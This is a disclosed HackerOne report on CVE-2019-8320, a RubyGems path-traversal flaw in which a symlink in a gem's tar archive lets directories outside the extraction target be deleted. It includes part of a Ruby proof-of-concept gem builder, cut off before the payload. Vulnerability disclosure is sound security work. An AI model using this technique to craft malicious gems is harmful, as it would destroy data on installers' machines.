# [M] Delete directory using symlink when decompressing tar

## Summary
Severity: Medium (CVSS 5.4)
Program: RubyGems
Weakness: Path Traversal
Reporter: ooooooo_q
State: resolved
Disclosed: 2019-04-11T11:53:38.276Z
CVE: CVE-2019-8320
Source: https://hackerone.com/reports/317321

## Details
In 2.7.6, the safety of symlink is confirmed with `mkdir_p_safe`,
Before that `FileUtils.rm_rf destination` is running.
Therefore, if `tmp/dir` is specified after `tmp -> /tmp`, the following `/tmp/dir` is deleted.

### Proof of concept

#### builder.rb

```ruby
require 'rubygems/package'

class GemBuiler

   def initialize spec, path
    @_build_time      = Time.now
    @_checksums       = {}
    @_signer          = Gem::Security::Signer.new nil, nil, ""
    @_spec            = spec
    @_path            = path
  end

  def build &block
    Gem.load_yaml
    require 'rubygems/security'

    @_spec.mark_version

    File.open @_path, 'wb' do |gem_io|
      Gem::Package::TarWriter.new gem_io do |gem|
        add_metadata gem
        add_contents gem, &block
        add_checksums gem
      end
    end
  end

  def add_checksums tar
    Gem.load_yaml
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/317321_
